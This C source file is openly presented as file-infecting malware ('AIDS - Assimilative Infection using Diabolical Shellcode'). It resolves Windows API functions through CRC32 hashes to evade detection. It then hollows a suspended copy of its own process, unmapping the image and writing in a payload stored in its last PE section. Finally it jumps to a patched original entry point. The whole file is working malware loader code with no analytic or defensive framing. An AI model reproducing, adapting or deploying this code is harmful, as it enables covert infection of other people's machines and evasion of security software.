// AIDS - Assimilative Infection using Diabolical Shellcode
// Options: persistence, show payload window

#include <Windows.h>
#include <winnt.h>

#define POLY 0xEDB88320

HMODULE get_kernel32(void);
LPSTR get_payload_string();
LPSTR get_ntdll_string();
LPSTR get_zwunmapviewofsection_string();

typedef BOOL(WINAPI *pfnCreateProcessA)(LPCSTR lpApplicationName, LPCSTR lpComandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCSTR lpCurrentDirectory, LPSTARTUPINFO lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);
typedef HANDLE(WINAPI *pfnCreateThread)(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
typedef DWORD(WINAPI *pfnWaitForSingleObject)(HANDLE hHandle, DWORD dwMilliseconds);
typedef DWORD(WINAPI *pfnGetModuleFileNameA)(HMODULE hModule, LPCSTR lpFileName, DWORD nSize);
typedef HMODULE(WINAPI *pfnGetModuleHandleA)(LPCSTR lpModuleName);
typedef BOOL(WINAPI *pfnGetThreadContext)(HANDLE hThread, PCONTEXT lpContext);
typedef LPVOID(WINAPI *pfnVirtualAllocEx)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
typedef BOOL(WINAPI *pfnWriteProcessMemory)(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten);
typedef BOOL(WINAPI *pfnSetThreadContext)(HANDLE hThread, CONTEXT *lpContext);
typedef DWORD(WINAPI *pfnResumeThread)(HANDLE hThread);
typedef FARPROC(WINAPI *pfnGetProcAddress)(HMODULE hModule, LPCSTR lpProcName);
typedef VOID(WINAPI *pfnZwUnmapViewOfSection)(HANDLE ProcessHandle, PVOID BaseAddress);
typedef HRSRC(WINAPI *pfnFindResourceA)(HMODULE hModule, LPCSTR lpName, LPCSTR lpType);
typedef HGLOBAL(WINAPI *pfnLoadResource)(HMODULE hModule, HRSRC hResData);
typedef LPVOID(WINAPI *pfnLockResource)(HGLOBAL hResData);
typedef DWORD(WINAPI *pfnSizeofResource)(HMODULE hModule, HRSRC hResInfo);

unsigned int crc32b(const char *buf, unsigned int len) {
	unsigned int crc = ~0;
	while (len--) {
		crc ^= *buf++;
		for (int k = 0; k < 8; k++)
			crc = crc & 1 ? (crc >> 1) ^ POLY : crc >> 1;
	}

	return ~crc;
}

void *MyMemset(void *b, int c, int len) {
	unsigned char *p = b;
	int i = 0;
	while (len > 0) {
		*p = c;
	  	p++;
	  	len--;
	}

	return b;
}

int MyStrlen(LPCSTR s) {
	for (int i = 0; ; i++)
		if (!s[i]) return i;

	return 0;
}

int MyStrcmp(LPCSTR s1, LPCSTR s2) {
	for (int i = 0; i < MyStrlen(s1); i++) {
		if (s1[i] != s2[i])
			return 1;
	}

	return 0;
}

FARPROC GetKernel32Function(DWORD crc32) {
	HMODULE hKernel32Mod = get_kernel32();

	// get DOS header
	PIMAGE_DOS_HEADER pidh = (PIMAGE_DOS_HEADER)(hKernel32Mod);
	// get NT headers
	PIMAGE_NT_HEADERS pinh = (PIMAGE_NT_HEADERS)((DWORD)hKernel32Mod + pidh->e_lfanew);
	// find eat
	PIMAGE_EXPORT_DIRECTORY pied = (PIMAGE_EXPORT_DIRECTORY)((DWORD)hKernel32Mod + pinh->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

	// find export table functions
	LPDWORD dwAddresses = (LPDWORD)((DWORD)hKernel32Mod + pied->AddressOfFunctions);
	LPDWORD dwNames = (LPDWORD)((DWORD)hKernel32Mod + pied->AddressOfNames);
	LPWORD wOrdinals = (LPWORD)((DWORD)hKernel32Mod + pied->AddressOfNameOrdinals);

	// loop through all names of functions
	for (int i = 0; i < pied->NumberOfNames; i++) {
		LPSTR lpName = (LPSTR)((DWORD)hKernel32Mod + dwNames[i]);
		if (crc32b(lpName, MyStrlen(lpName)) == crc32)
			return (FARPROC)((DWORD)hKernel32Mod + dwAddresses[wOrdinals[i]]);
	}

	return NULL;
}

LPVOID GetPayload(LPVOID lpModule) {
	// get DOS header
	PIMAGE_DOS_HEADER pidh = (PIMAGE_DOS_HEADER)lpModule;
	// get NT headers
	PIMAGE_NT_HEADERS pinh = (PIMAGE_NT_HEADERS)((DWORD)lpModule + pidh->e_lfanew);

	// find .text section
	PIMAGE_SECTION_HEADER pishText = IMAGE_FIRST_SECTION(pinh);
	// get last IMAGE_SECTION_HEADER
	PIMAGE_SECTION_HEADER pishLast = (PIMAGE_SECTION_HEADER)(pishText + (pinh->FileHeader.NumberOfSections - 1));

	return (LPVOID)(pinh->OptionalHeader.ImageBase + pishLast->VirtualAddress);
}

HANDLE RunPE(LPVOID lpPayload) {
	// get file name
	CHAR szFileName[MAX_PATH];
	pfnGetModuleFileNameA fnGetModuleFileNameA = (pfnGetModuleFileNameA)GetKernel32Function(0x08BFF7A0);
	fnGetModuleFileNameA(NULL, szFileName, MAX_PATH);
	// first extract header info
	// check if valid DOS header
	PIMAGE_DOS_HEADER pidh = (PIMAGE_DOS_HEADER)lpPayload;
	//if (pidh->e_magic != IMAGE_DOS_SIGNATURE)
	//	return false;
	// check if valid pe file
	PIMAGE_NT_HEADERS pinh = (PIMAGE_NT_HEADERS)((DWORD)lpPayload + pidh->e_lfanew);
	if (pinh->Signature != IMAGE_NT_SIGNATURE)
		return NULL;

	// process info
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	MyMemset(&pi, 0, sizeof(pi));
	MyMemset(&si, 0, sizeof(si));
	si.cb = sizeof(si);
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_SHOW;

	// first create process as suspended
	pfnCreateProcessA fnCreateProcessA = (pfnCreateProcessA)GetKernel32Function(0xA851D916);
	if (!fnCreateProcessA(szFileName, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED | DETACHED_PROCESS, NULL, NULL, &si, &pi))
		return NULL;

	CONTEXT ctx;
	ctx.ContextFlags = CONTEXT_FULL;
	pfnGetThreadContext fnGetThreadContext = (pfnGetThreadContext)GetKernel32Function(0x649EB9C1);
	if (!fnGetThreadContext(pi.hThread, &ctx))
		return NULL;

	// unmap memory space for our process
	pfnGetProcAddress fnGetProcAddress = (pfnGetProcAddress)GetKernel32Function(0xC97C1FFF);
	pfnGetModuleHandleA fnGetModuleHandleA = (pfnGetModuleHandleA)GetKernel32Function(0xB1866570);
	pfnZwUnmapViewOfSection fnZwUnmapViewOfSection = (pfnZwUnmapViewOfSection)fnGetProcAddress(fnGetModuleHandleA(get_ntdll_string()), get_zwunmapviewofsection_string());
	fnZwUnmapViewOfSection(pi.hProcess, (LPVOID)pinh->OptionalHeader.ImageBase);

	// allocate virtual space for process
	pfnVirtualAllocEx fnVirtualAllocEx = (pfnVirtualAllocEx)GetKernel32Function(0xE62E824D);
	LPVOID lpAddress = fnVirtualAllocEx(pi.hProcess, (LPVOID)pinh->OptionalHeader.ImageBase, pinh->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!lpAddress)
		return NULL;

	// write headers into memory
	pfnWriteProcessMemory fnWriteProcessMemory = (pfnWriteProcessMemory)GetKernel32Function(0x4F58972E);
	if (!fnWriteProcessMemory(pi.hProcess, (LPVOID)pinh->OptionalHeader.ImageBase, lpPayload, pinh->OptionalHeader.SizeOfHeaders, NULL))
		return NULL;

	// write each section into memory
	for (int i = 0; i < pinh->FileHeader.NumberOfSections; i++) {
		// calculate section header of each section
		PIMAGE_SECTION_HEADER pish = (PIMAGE_SECTION_HEADER)((DWORD)lpPayload + pidh->e_lfanew + sizeof(IMAGE_NT_HEADERS) + sizeof(IMAGE_SECTION_HEADER) * i);
		// write section data into memory
		fnWriteProcessMemory(pi.hProcess, (LPVOID)(pinh->OptionalHeader.ImageBase + pish->VirtualAddress), (LPVOID)((DWORD)lpPayload + pish->PointerToRawData), pish->SizeOfRawData, NULL);
	}

	// set starting address at virtual address: address of entry point
	ctx.Eax = pinh->OptionalHeader.ImageBase + pinh->OptionalHeader.AddressOfEntryPoint;
	pfnSetThreadContext fnSetThreadContext = (pfnSetThreadContext)GetKernel32Function(0x5688CBD8);
	if (!fnSetThreadContext(pi.hThread, &ctx))
		return NULL;

	// resume our suspended processes
	pfnResumeThread fnResumeThread = (pfnResumeThread)GetKernel32Function(0x3872BEB9);
	if (fnResumeThread(pi.hThread) == -1)
		return NULL;

	return pi.hProcess;
}

int MyMain() {
	pfnGetModuleHandleA fnGetModuleHandleA = (pfnGetModuleHandleA)GetKernel32Function(0xB1866570);
	LPVOID lpPayload = GetPayload(fnGetModuleHandleA(NULL));
	if (lpPayload) {
		HANDLE hProcess = RunPE(lpPayload);
		if (hProcess) {
			// pfnCreateThread fnCreateThread = (pfnCreateThread)GetKernel32Function(0x906A06B0);
			// fnCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)dwOEP, NULL, 0, NULL);
			//
			// pfnWaitForSingleObject fnWaitForSingleObject = (pfnWaitForSingleObject)GetKernel32Function(szWaitForSingleObject);
			// fnWaitForSingleObject(pi.hProcess);
			void(*oep)() = (void *)0x69696969;
			oep();
		}
	}

	return 0;
}
